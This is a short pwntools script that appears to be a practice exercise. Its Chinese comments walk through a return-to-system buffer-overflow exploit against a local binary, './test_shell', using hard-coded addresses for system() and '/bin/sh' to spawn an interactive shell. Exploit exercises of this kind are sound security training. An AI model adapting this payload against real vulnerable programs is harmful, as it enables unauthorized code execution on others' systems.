from pwn import *

p = process('./test_shell')

# 填你自己查到的地址！
system_addr = 0x8049070    # system 地址
bin_sh_addr = 0x0804a008    # /bin/sh 地址
offset = 32                 # 你测出来的精准偏移

# 构造 payload（和之前结构完全一样）
payload = b'A' * offset
payload += p32(system_addr)
payload += p32(0)
payload += p32(bin_sh_addr)

p.sendline(payload)
p.interactive()

